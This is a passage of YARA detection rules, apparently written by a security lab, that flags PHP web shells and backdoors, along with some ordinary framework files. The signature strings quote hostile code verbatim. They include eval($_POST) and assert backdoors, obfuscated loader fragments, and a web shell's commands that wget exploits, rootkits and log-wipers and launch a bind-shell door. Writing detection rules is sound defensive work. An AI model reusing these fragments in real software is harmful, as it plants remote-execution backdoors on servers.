      $s3 = "$mxzv=\"JdhGM9J2dhNvdW50JzskYT0kdhX0dhNPT0tJRTtpZihyZXNldCgdhkYSk9PSdwYScgJiYgJGMoJGEdhpPjMpdheyR\";" fullword ascii
      $s4 = "$rzax=\"rdhPSdzcdh3cwcmQnO2VjdhaGdh8gJzwnLiRrLidhc+JztldmFsKdhGJhc2U2dhNF9kdhZWNvZGUod\";" fullword ascii
      $s5 = "$boxz = $juqj('', $bcrs($hkts(\"dh\", \"\", $mxzv.$rzax.$czdj.$wrgj))); $boxz();" fullword ascii
      $s6 = "$hkts = str_replace(\"y\",\"\",\"ystyry_yryepylyayce\");" fullword ascii
      $s7 = "$juqj = $hkts(\"j\",\"\",\"jcrjejajtje_fjujnjctjiojn\");" fullword ascii
      $s8 = "$bcrs = $hkts(\"k\", \"\", \"kbkakske6k4k_dkekckodke\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_33chartcreate_multiple_charts
{
   meta:
      description = "php17 - file 33chartcreate-multiple-charts.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4c1b8dd44e437f8abbab91f50420f1f6dc44539fc71a0d6f45cb2c628decc5e3"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s4 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s5 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s6 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xlsx', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s7 = "/** Error reporting */" fullword ascii
      $s8 = "$legend2 = new PHPExcel_Chart_Legend(PHPExcel_Chart_Legend::POSITION_RIGHT, NULL, false);" fullword ascii
      $s9 = "$legend1 = new PHPExcel_Chart_Legend(PHPExcel_Chart_Legend::POSITION_TOPRIGHT, NULL, false);" fullword ascii
      $s10 = "echo 'File has been created in ' , getcwd() , EOL;" fullword ascii
      $s11 = "$objWorksheet = $objPHPExcel->getActiveSheet();" fullword ascii
      $s12 = "* @version    ##VERSION##, ##DATE##" fullword ascii
      $s13 = "$objWriter->save(str_replace('.php', '.xlsx', __FILE__));" fullword ascii
      $s14 = "$chart1->setTopLeftPosition('A7');" fullword ascii
      $s15 = "$chart2->setTopLeftPosition('I7');" fullword ascii
      $s16 = "$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');" fullword ascii
      $s17 = "new PHPExcel_Chart_DataSeriesValues('Number', 'Worksheet!$B$2:$B$5', NULL, 4)," fullword ascii
      $s18 = "new PHPExcel_Chart_DataSeriesValues('Number', 'Worksheet!$C$2:$C$5', NULL, 4)," fullword ascii
      $s19 = "new PHPExcel_Chart_DataSeriesValues('String', 'Worksheet!$D$1', NULL, 1)," fullword ascii
      $s20 = "new PHPExcel_Chart_DataSeriesValues('String', 'Worksheet!$A$2:$A$5', NULL, 4)," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_11cf0149955d4a310748fbf190f89858292d36b2
{
   meta:
      description = "php17 - file 11cf0149955d4a310748fbf190f89858292d36b2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "02f6455880d75d824df9aadf987b7f2aa7f2aae3345c9e05b35674b5e6b503c1"
   strings:
      $s1 = "<?php $c='ass'.'ert';${c}($_POST[4]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_472aa6401e3a15e9a6fe7b93dbe4f0f7ae856b21
{
   meta:
      description = "php17 - file 472aa6401e3a15e9a6fe7b93dbe4f0f7ae856b21.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e67c57648b0fc615488ced55a2f0bf20f00d070937d5d2d93d726170cfd68799"
   strings:
      $s1 = "I5umG5CFYijc1UwBmCvE694LZfanG4ExzKvlGfliNhqNRm8G8+PQXhBh6M8+sxMaw91z2ZXtx4FlFYzS3cFvk/0H9Xm65OMQ8f3XX+jTyV1SbU+SqoRfYaRxW+JVeZJj" ascii
      $s2 = "FCi2ylRNsrZa/bJEX7TqRfy/v2Uwa2N44ZWHeiTKOilRJt7ZRo3YmyzNtVoq2dEq0/o1S9J242P9878XzPVxNj4xuCjkedPnfob5zF6pXFq1lQVJJo4P6XKo5xMNZzrR" ascii
      $s3 = "gl7ODdaP9gf/TnIHwQQ7SmMTGF5GUhzP78xvM/ev4tPQuC6/nZ1U1A72xiLJdLx7CI67okDjPBrF73GWC3eUNaW9eB6KXXZRBM3gwW1RdIpi2Td5bG6Qv+D3e3Ojl0CM" ascii
      $s4 = "/BNwcL+JineSpNbLudzjP+qEVoiUUptaNNjmb+xdV1MIcH6E+kLMfDIZDhhHXUGHWUDkfrcjBBFPcmmO8FM/8y8KeXNyDNJpJX7KdB2ApVJ7Sb8/S1ScIQUTC6Aloke2" ascii
      $s5 = "cj5dZektfgfxHA3Spn6i4wJkdYDvTa9IyXPJUMldkqylqtL5M0YzDVY1bESvdauMLHE+e48T2TQseODg7r0BcUwJmoMiwQeyoz7P3GmtnW4TY5sGqtcHvSAbejuzqx1e" ascii
      $s6 = "oGqKzXjas8kmmRk1MmfRZm56Wpcyeoeo89lvJ7k+vo4ty7DObn1/TOsiBZ8kwI6ael2+43gZQIamtH/Xt+cuV/mvrH3jG+IbaG3oL8H981/tZsfO/DVeDNp8fHtStnsu" ascii
      $s7 = "KRxtqgiLJCsM3Vl1X9ITbGm0QsiuihKFluKqk2OdwHXsZ5Xugn7K5N/tivhwNEWQTHKA4jzW5AWyZGW5Ecg2Dyw5Ez+sw/58ZkI9aB4DNgHWO4qrRR+3TWDjPB+GB6D9" ascii
      $s8 = "nvndk1jo8zac9fDN6ZeZ55ZpeZTVi4YNykR0UuWS4HwfeSjYlkT3KYyMdsQqIk5IJJdxacDA6pNel1+yVxCS3phMB7UgjpUhEuQlEtqlAs0iRMxSJcOLyiyjmUiUuHUR" ascii
      $s9 = "\\x28\";$YvON2803 = \")\\x29\\x29\".chr(59).\"\";$WYvqrVo1039 = $bQI599.\"'nVZtb5tIEP5sS/4PG2Tdgg7jONerIlvoZCXkRUqTiOD2pDSyKF4CD" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      all of them
}

rule aabfd179aaf716929c8b820eefa3c1f613f8dcac
{
   meta:
      description = "php17 - file aabfd179aaf716929c8b820eefa3c1f613f8dcac.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4cbe4fd899d4228e2ce185d9263713d0aa538e4d9cb7b797bb636201e93b22ff"
   strings:
      $s1 = "$poos=$s0.$s1.$s2.$s3.$s4.$s5.\"[mima]);\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0bfa18909021ed1c2a997e6649d7a1db909d1ae2
{
   meta:
      description = "php17 - file 0bfa18909021ed1c2a997e6649d7a1db909d1ae2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c46cc03e1837593f4720c4134b065b2830130644dc2d705f6a13f54b5cff1a41"
   strings:
      $s1 = "eval($_POST['op']);" fullword ascii
      $s2 = "'~[t]+~i' => function ($match) {" fullword ascii
      $s3 = "'~[n]+~i' => function ($match) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_153d76bdb64327757c80d09346241904498189eb
{
   meta:
      description = "php17 - file 153d76bdb64327757c80d09346241904498189eb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad368d7e5ca7fdf4e47ec12c4b64a516ec25ab87e10f42a51a0a5b77ca464e0d"
   strings:
      $s1 = "$_=$____.$___.$_________.$_______.'6'.'4'.'_'.$______.$_______.$_____.$________.$______.$_______;" fullword ascii
      $s2 = "$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O" fullword ascii
      $s3 = "//ASSERT(BASE64_DECODE(\"ZXZhbCgkX1BPU1RbMV0p\"));" fullword ascii
      $s4 = "//ASSERT(\"eval($_POST[1])\");" fullword ascii
      $s5 = "$__=$___.$_________.$_________.$_______.$________.$_____;" fullword ascii
      $s6 = "$_________++;$_________++;$_________++;$_________++;//S" fullword ascii
      $s7 = "$________++;$________++;$________++;//R" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_0c7e7e6ebb82f0375d8682d6f4606e0bb174c259
{
   meta:
      description = "php17 - file 0c7e7e6ebb82f0375d8682d6f4606e0bb174c259.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50d55e080c786fbb87444151073bef179eb176f98beef40f8fee7483b8d6bb95"
   strings:
      $s1 = "yGVb+5XEbo9Xp9vgEtftP5dY6TPWUm5Ps5nYOO+TuIkyEms3yNYVQGkj/GkbfgXGgB40YVri7EMW" fullword ascii
      $s2 = "KtSpY52hi0J0bCW4vB9rB+yc9zzfPtYnKIIppJJDG+LtOcIvoW5CJ+JJIYv4B/y50QXAzrTIG8dg" fullword ascii
      $s3 = "EOe3347MD5vds+uZcnzl13aQLvw4YWrAX5cSTTDLcp9bvk1UqTbtcMdhLWurmwnoUa0JHN0B7ILE" fullword ascii
      $s4 = "5zHeSf3gA2VvCRK8xfCtlAr+63kne8Odabig7BAB9u1TFmGAeP8W9F4STkm/pcS+pojJa0gC/ZAdZdVpY5uce+rmtI8VOf8/cgMxTTAPawncFlOXDvcIOy7o2mWezbIC" ascii
      $s5 = "KSOu0nNqxCpDkK8Gt4BVzCK1sN5LNHA58r6QukGfCXY5D+ppJvZICPrU/zPfBq4GRswC+Svw/f6aEc8q4QOqSoUQg/icGQiH8rJQB+KWcLZdOxUQF/5yasEVk44EIgNR" ascii
      $s6 = "/2Yr4Rzd+1/T3F1UOQp5/v9/qtYqKn5+zfUp0++PfTPPWrx8iAgbtipP81/3+S235trJIY38q+1m+tv6b9Ovh1cOinNvBpv0z2BfWRp8piH5FCoOEfP22IjafUn2Kwru" ascii
      $s7 = "/2Yr4Rzd+1/T3F1UOQp5/v9/qtYqKn5+zfUp0++PfTPPWrx8iAgbtipP81/3+S235trJIY38q+1m+tv6b9Ovh1cOinNvBpv0z2BfWRp8piH5FCoOEfP22IjafUn2Kwru" ascii
      $s8 = "D2X2Hovl8Amdfo4vtgctnX+wXsGz5i/OeH2DbTtZvkML7YoQfvJ7f9AQxjWNNK//zv3/9z+7H9VS" fullword ascii
      $s9 = "sK+7L2Tb9o3Rux1+vV+v3ajknrxA0Xz4jn//z739z7xrN/uGR5J89+ay8OUZG95X+7NvSl7l3/+/" fullword ascii
      $s10 = "44QNEpD3+FGiSnKrVrKOPe5/P/eNMICZRH08GdqsiAbDCyIm1ro1LqQIdOkRlX8owQ5lA8l9vwfQ" fullword ascii
      $s11 = "o9srYB21ZHsbuyhgIE6ehuID+05uCom4sU0T5hOokx5DI1Yi+LAnH7dc6Powt6jHOn68oNsZN1IYuvj1zcP8RXa8BReSutG0tGpaRCyvs796PoPi+PgADZdjm+7q5jf6" ascii
      $s12 = "UepOe3hLnmKYNJeNbnUybDUrdmC9Q52gk0nVqUCdgFWJ4s/T/UGadZBu3mcZAsxU6UqU5Y0Ah/LQ" fullword ascii
      $s13 = "UrGX81gSr76BVkNyeDZm2u+7rTON8Ev1KO5fu3dGF0DkDqHT8Q2UHjkQlT6a+vKjJele9P/H/v/v" fullword ascii
      $s14 = "vpabVeg9uvoX07lVUafH7Kuqd6OBpvL00ihXsIwTjcxsf0hIAP3xquXrNQC8W5MNI2BVv8mnIEyu" fullword ascii
      $s15 = "qnyfrcCkjCgvtnC/AD+iL3c54T8gMfrY9U905hPSvgRnbOA17ZWU5r8iMVsDeWCGmPQins6hJNj2" fullword ascii
      $s16 = "+h7W2Ue3XsVYNoW71BinVElXqm0wlhB/iPYlLfT3zXFWgFssqNizzCGAUeay9g7XXcqs1BUHD1uOlH5nR5j1r3PAE5G4EWdnEcmgy9M2bLGhXrPe0rWIQs4r6M78E1b+" ascii
      $s17 = "o9srYB21ZHsbuyhgIE6ehuID+05uCom4sU0T5hOokx5DI1Yi+LAnH7dc6Powt6jHOn68oNsZN1IYuvj1zcP8RXa8BReSutG0tGpaRCyvs796PoPi+PgADZdjm+7q5jf6" ascii
      $s18 = "UHdN/K82s4L6j8Y2A1wQYg+2sk9xuIE/CZDNPEZItKxAOFjpJTALmB0kFMJtoU+9VL10AOiWLX4v" fullword ascii
      $s19 = "G7A/A7OMYUXLu0ZlRlrGWOC2wH6ENgFDlUhQ0KsBd/C3/IDuOj2gWOiYJpTdVGKl9rrjajBap7m2" fullword ascii
      $s20 = "5NJ8L2MQY7DrJMBrX15hT6vh8nTmYgfoDNzdW5Sulqb0XYL+8xjfTknK6AfgH2vWtF2gxwzofVmN" fullword ascii
   condition:
      uint16(0) == 0x3846 and filesize < 30KB and
      8 of them
}

rule ApplicationConfigWriter
{
   meta:
      description = "php17 - file ApplicationConfigWriter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "be698049e718395f2a6c7ae5152193cd139cfb6c603002e2116d212417c1ec26"
   strings:
      $s1 = "* @var array Configuration array that will be written to filesystem" fullword ascii
      $s2 = "* @var bool true if we should load configuration from original file and merge all configuration with it" fullword ascii
      $s3 = "$data .= VarDumper::export($this->configuration);" fullword ascii
      $s4 = "* Add values to current configuration array with merging." fullword ascii
      $s5 = "* @package app\\modules\\config\\helpers" fullword ascii
      $s6 = "* @var string Filename to read-write for" fullword ascii
      $s7 = "Yii::trace('Application configuration file does not exist - ' . $filename);" fullword ascii
      $s8 = "Yii::trace('Application configuration file is not an array - ' . $filename);" fullword ascii
      $s9 = "* @throws InvalidConfigException" fullword ascii
      $s10 = "* Writes all configuration to application configuration file" fullword ascii
      $s11 = "use yii\\helpers\\VarDumper;" fullword ascii
      $s12 = "* @param array $values Values to merge from" fullword ascii
      $s13 = "* @var string Code to append" fullword ascii
      $s14 = "$this->configuration = ArrayHelper::merge($this->configuration, $values);" fullword ascii
      $s15 = "return file_put_contents($filename, $data, LOCK_EX) !== false;" fullword ascii
      $s16 = "* @return bool result, true if success" fullword ascii
      $s17 = "* Please don't modify it by-hand or all your changes can be lost." fullword ascii
      $s18 = "* Writer for application configs" fullword ascii
      $s19 = "* This file is auto-generated." fullword ascii
      $s20 = "$filename = Yii::getAlias($this->filename);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule sig_922a61bd758cffc0a56a079fa1843023d4ca1ffa
{
   meta:
      description = "php17 - file 922a61bd758cffc0a56a079fa1843023d4ca1ffa.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dac34be0c97e26e2a37fdf463dd4138dc615145edcb66fe930b9993810ad30c8"
   strings:
      $s1 = "$e='H\"),$ss($s[$i],0,$e)))FH,$k)))FH;$oFH=ob_get_FHconFHtents();FHobFH_end_clean(FH);$d=baFHse64FH_';" fullword ascii
      $s2 = "$q='}}rFHeturn FH$o;FH}$r=$_SFHEFHRVEFHR;$rr=FH@$r[\"FHFHHTTPFH_RFHEFERER\"];$ra=@$r[\"HTFHTP_ACCFHEPT';" fullword ascii
      $s3 = "$U='rpos($FHp,$h)===0){FHFH$FHs[$i]=\"\";$p=$ss($FHFHp,3);}if(aFHrraFHy_key_exiFHsts($i,$FHFHs)){$sFH';" fullword ascii
      $s4 = "$I='rray_FHvalFHues($q);FHpreg_matFHchFH_allFH(FH\"/([\\\\w])[\\\\w-]FH+(?:FH;FHq=0.([\\\\FHd]))?,?/\",$rFHa,$';" fullword ascii
      $s5 = "$E='m);if($qFH&FH&$m){@FHsessFHion_stFHFHarFHt();$s=&$_SESSFHIONFH;$ss=\"subFHstFHr\";$sl=FH\"FHstrtol';" fullword ascii
      $s6 = "$m='$kh=\"5d41\"FHFH;$kf=\"40FH2a\";functiFHon FHx($t,$k){FH$cFH=stFHrlen($FHFHk);$l=strFHlen($FHt);$o=';" fullword ascii
      $s7 = "$K='_LAFHNGUAGE\"];if($rFHr&&$ra)FH{$u=pFHarse_urlFHFHFH($rr);parse_str($uFH[\"queFHry\"]FHFH,$q);$q=a';" fullword ascii
      $s8 = "$M='ompress(@x(@FHFHbase6FHFH4_decoFHde(FHpreg_replace(FHFHarray(\"/_/\",\"/-/\"),FHarray(\"/FHFH\"FH,\"+F';" fullword ascii
      $s9 = "$A='[FH$i].=$p;$eFH=strpos($sFH[$i],$fFH);iFHf($e){$k=$kFHhFHFH.$kf;obFH_start();@eFHval(@FHgFHzunc';" fullword ascii
      $s10 = "$j='ower\";FH$i=$m[1][0FH].$m[1][1FH];$h=$sl(FH$ss(md5FH($i.FH$kh),0FH,3));$FHf=$slFH($ss(FHmd5($i.$';" fullword ascii
      $s11 = "$w='enFHcode(x(gzcoFHmFHFHpress($o),$k));FHprintFH(\"<$k>$FHd</$k>FH\");@seFHFHssion_desFHtroy();}}}}';" fullword ascii
      $s12 = "$b='FHkf)FH,0,3));FH$p=\"\";foFHr($z=1;$FHz<FHcount(FH$m[1]);FH$FHz++)$p.=$qFH[$m[2][$FHzFH]]FH;if(st';" fullword ascii
      $s13 = "$y='\"\";for($i=0FH;$iFH<$l;){forFH($j=FH0;($j<$c&FH&$i<FH$l);$FHFHj++,$i++){$o.=FH$t{$i}^FHFH$k{$j};';" fullword ascii
      $s14 = "$F=str_replace('FH','',$m.$y.$q.$K.$I.$E.$j.$b.$U.$A.$M.$e.$w);" fullword ascii
      $s15 = "$f=str_replace('l','','llcreatel_flunlctilon');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php17_acid
{
   meta:
      description = "php17 - file acid.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a6580477b138c01f062a33f2f204f412d3ffcdfd44dd6bffe476aefefab1fca3"
   strings:
      $x1 = "array(\"wget Sudo Exploit\",\"wget http://www.securityfocus.com/data/vulnerabilities/exploits/sudo-exploit.c\")," fullword ascii
      $x2 = "function tpftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh) {" fullword ascii
      $x3 = "displaysecinfo(\"Kernel Version\",tpexec(\"sysctl -a | grep version\"));" fullword ascii
      $x4 = "elseif ( enabled(\"passthru\") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x5 = "elseif ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x6 = "if ( enabled(\"system\") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }" fullword ascii
      $x7 = "\"<tr><td></td><td><input type=\\\"checkbox\\\" name=\\\"fqb_onlywithsh\\\" value=\\\"1\\\"> Users only with shell</td></tr>\"." fullword ascii
      $x8 = "echo(\"<center><b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $x9 = "elseif (is_callable('system') and !in_array('system',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $resu" fullword ascii
      $x10 = "elseif (is_callable('passthru') and !in_array('passthru',$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd);" fullword ascii
      $x11 = "array(\"wget RatHole 1.2 (Linux & BSD)\",\"wget http://packetstormsecurity.org/UNIX/penetration/rootkits/rathole-1.2.tar.gz\")," fullword ascii
      $x12 = "echo \"<b>Dumped! Dump has been writed to \\\"\".htmlspecialchars(realpath($sql_dump_file)).\"\\\" (\".view_size(filesiz" fullword ascii
      $x13 = "array(\"Downloaders?\",\"which wget curl w3m lynx fetch lwp-download\")," fullword ascii
      $x14 = "array(\"wget & run BindDoor\",\"wget \".$sh_mainurl.\"bind.tgz;tar -zxvf bind.tgz;./4877\")," fullword ascii
      $x15 = "srv_info(\"ID\",($win) ? get_current_user().\" (uid=\".getmyuid().\" gid=\".getmygid().\")\" : tpexec(\"id\"));" fullword ascii
      $x16 = "array(\"wget WIPELOGS PT1\",\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\")," fullword ascii
      $x17 = "if (!$fp) {return \"Local error: can't write update to \".__FILE__.\"! You may download tpshell.php manually <a href=\\\"\"." fullword ascii
      $s18 = "<input type=hidden name=\"cmd_txt\" value=\"1\"> <input type=submit name=submit value=\"Execute\">" fullword ascii
      $s19 = "$logfile = $tmpdir_logs.\"tpsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s20 = "<title>'.getenv(\"HTTP_HOST\").' - '.sh_name().'</title>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule sig_2017_01_20_125015_create_jobs_table
{
   meta:
      description = "php17 - file 2017_01_20_125015_create_jobs_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b79f1dc15a8a81708071e379c8100fc2aec4b06d5729b4ee6241b4987782f91"
   strings:
      $s1 = "$table->longText('payload');" fullword ascii
      $s2 = "$table->tinyInteger('attempts')->unsigned();" fullword ascii
      $s3 = "Schema::create('jobs', function (Blueprint $table) {" fullword ascii
      $s4 = "$table->unsignedInteger('reserved_at')->nullable();" fullword ascii
      $s5 = "$table->unsignedInteger('available_at');" fullword ascii
      $s6 = "$table->index(['queue', 'reserved_at']);" fullword ascii
      $s7 = "Schema::dropIfExists('jobs');" fullword ascii
      $s8 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
      $s9 = "$table->string('queue')->index();" fullword ascii
      $s10 = "$table->unsignedInteger('created_at');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_6e14d0226dabdbe5a5e3c81e4e07ce3534d0018d
{
   meta:
      description = "php17 - file 6e14d0226dabdbe5a5e3c81e4e07ce3534d0018d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "759204cec7f9891cbc44845bb8fa9976691ed4be2d356db0d15226548e1dde4a"
   strings:
      $x1 = "fputs($url,\"GET /$file HTTP/1.0\\r\\nAccept-Encoding: text\\r\\nHost: $host\\r\\nReferer: $host\\r\\nUser-Agent: Mozilla/5.0 " fullword ascii
      $x2 = "$output .= \"Trovato Possibile $evil[$i] in <a class='link' href='{$scandir}{$file}' target='_blank'>{$file}</a><br>\"; " fullword ascii
      $x3 = "<div align=\"center\"><strong>:: Cmd Execution ::  </strong><br>" fullword ascii
      $x4 = "x.src = \"<?=base64_decode($images[url]).getenv(\"HTTP_HOST\").$_SERVER['PHP_SELF']?>\";" fullword ascii
      $s5 = "$link = mysql_connect($_POST['host'], $_POST['user'], $_POST['pass'])or die(mysql_error());" fullword ascii
      $s6 = "$dump .= \"# \".$_COOKIE['mysql_user'].\":\".$_COOKIE['mysql_pass'].\"@\".$_COOKIE['mysql_host'].\"\\n\";" fullword ascii
      $s7 = "$link = mysql_connect($_COOKIE['mysql_host'], $_COOKIE['mysql_user'], $_COOKIE['mysql_pass'])or die(mysql_error());" fullword ascii
      $s8 = "$file_name = $db.\"_dump_\".date(\"d_M_Y\").\"_Nexpl0rer.\".sql;" fullword ascii
      $s9 = "<div align=\"center\"><a class=\"link\" href=\"javascript:document.folder.dir.value='<?=addslashes(realpath(\".\"))?>';document." ascii
      $s10 = "shell_exec(stripslashes($_POST['cmd']));" fullword ascii
      $s11 = "<input type=\"text\" name=\"host\" size=\"10\" value=\"<?=(isset($_COOKIE[mysql_host]))?$_COOKIE[mysql_host]:\"host\"?>\" />" fullword ascii
      $s12 = "mysql_query($bypass)or die(\"Mysql-exploit-error : \".mysql_error());" fullword ascii
      $s13 = "function datadump ($table) { // <--- thx to mrwebmaster for function" fullword ascii
      $s14 = "exec(stripslashes($_POST['cmd']));" fullword ascii
      $s15 = "$dump = \"# Dumped by Nexpl0rerSh 3.1 FUD Release \\n\";" fullword ascii
      $s16 = "$result .= \"# Dump DATE : \" . date(\"d-M-Y\") .\"\\n\\n\";" fullword ascii
      $s17 = "$dump .= \"# MySQL version: (\".@mysql_get_server_info().\") running on \".getenv(\"SERVER_ADDR\").\" (\".getenv(\"SERVER_NAME\"" ascii
      $s18 = "$dump .= \"# Database: \".$_POST['dbname'].\"\\n\";" fullword ascii
      $s19 = "<title><?=\"[nex@\".getenv(\"HTTP_HOST\").\" ~]\"?></title></head>" fullword ascii
      $s20 = "<div align=\"center\"><strong>:: PHP Execution ::  </strong><br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}


rule sig_1dbf772787fce27b4c06a33b8199d8cfa92bc7e8
{
   meta:
      description = "php17 - file 1dbf772787fce27b4c06a33b8199d8cfa92bc7e8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ca33813ea6fa53e213fb9a50d6a5c775571517a8c56d08fe617124dfbcc9113"
   strings:
      $s1 = "$hh(\"/[discuz]/e\",$_POST['h'],\"Access\");" fullword ascii
      $s2 = "$hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractVoucherSeries
{
   meta:
      description = "php17 - file AbstractVoucherSeries.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "653f088ce589737d382543385785ec07b691dbed0df30649738a7ebdeaad7f51"
   strings:
      $x1 = "* @return bool|\\Pimcore\\Bundle\\EcommerceFrameworkBundle\\VoucherService\\TokenManager\\ITokenManager" fullword ascii
      $s2 = "* @throws \\Pimcore\\Bundle\\EcommerceFrameworkBundle\\Exception\\InvalidConfigException" fullword ascii
      $s3 = "SELECT length, COUNT(*) AS count FROM ' . \\Pimcore\\Bundle\\EcommerceFrameworkBundle\\VoucherService\\Token\\Dao::TABLE_N" fullword ascii
      $s4 = "return Factory::getInstance()->getTokenManager($configuration);" fullword ascii
      $s5 = "* @return \\Pimcore\\Model\\DataObject\\Fieldcollection" fullword ascii
      $s6 = "namespace Pimcore\\Bundle\\EcommerceFrameworkBundle\\Model;" fullword ascii
      $s7 = "abstract public function getTokenSettings();" fullword ascii
      $s8 = "$items = $this->getTokenSettings();" fullword ascii
      $s9 = "$configuration = $items->get(0);" fullword ascii
      $s10 = "public function getTokenManager()" fullword ascii
      $s11 = "use Pimcore\\Bundle\\EcommerceFrameworkBundle\\Factory;" fullword ascii
      $s12 = "$lengths = $db->fetchAll($query, [$this->getId()]);" fullword ascii
      $s13 = "public function getExistingLengths()" fullword ascii
      $s14 = "SELECT length, COUNT(*) AS count FROM ' . \\Pimcore\\Bundle\\EcommerceFrameworkBundle\\VoucherService\\Token\\Dao::TABLE_NAME . " ascii
      $s15 = "$db = \\Pimcore\\Db::get();" fullword ascii
      $s16 = "if ($items && $items->get(0)) {" fullword ascii
      $s17 = "$result[$lengthEntry['length']] = $lengthEntry['count'];" fullword ascii
      $s18 = "abstract class AbstractVoucherSeries extends \\Pimcore\\Model\\DataObject\\Concrete" fullword ascii
      $s19 = "foreach ($lengths as $lengthEntry) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      1 of ($x*) and 4 of them
}

rule sig_741cabef87a9411d2f518f6d4fa31af97aead811
{
   meta:
      description = "php17 - file 741cabef87a9411d2f518f6d4fa31af97aead811.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "29e54d7b2d1783239ec62ec6198695deeb8864c74e2f3baf4856328357d41216"
   strings:
      $s1 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword ascii
      $s2 = "if(isset($_POST['page'])) {" fullword ascii
      $s3 = "$page = $_POST[page];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ArrayListTokenizer
{
   meta:
      description = "php17 - file ArrayListTokenizer.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27cbb84bcb170d3ad8152b2c31a6f40d09e4fc61307c0fe8937213b5e811ad0d"
   strings:
      $s1 = "* @license   https://github.com/opulencephp/Opulence/blob/master/LICENSE.md" fullword ascii
      $s2 = "* @link      https://www.opulencephp.com" fullword ascii
      $s3 = "throw new RuntimeException('No command name given');" fullword ascii
      $s4 = "* Defines the array list tokenizer" fullword ascii
      $s5 = "* @copyright Copyright (C) 2017 David Young" fullword ascii
      $s6 = "$tokens = array_merge($tokens, $input['arguments']);" fullword ascii
      $s7 = "$tokens = array_merge($tokens, $input['options']);" fullword ascii
      $s8 = "namespace Opulence\\Console\\Requests\\Tokenizers;" fullword ascii
      $s9 = "* Opulence" fullword ascii
      $s10 = "public function tokenize($input) : array" fullword ascii
      $s11 = "$tokens = [$input['name']];" fullword ascii
      $s12 = "use RuntimeException;" fullword ascii
      $s13 = "class ArrayListTokenizer implements ITokenizer" fullword ascii
      $s14 = "if (!isset($input['options'])) {" fullword ascii
      $s15 = "if (!isset($input['arguments'])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_70d6823e4bbc133e31064c3365c22140a92280d0
{
   meta:
      description = "php17 - file 70d6823e4bbc133e31064c3365c22140a92280d0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6d79dca73a32ad4ad0ef9a3552c42a8fc0870671288a29fad1b76c1d6081953a"
   strings:
      $s1 = "eVal CNM 'pass:" fullword ascii
   condition:
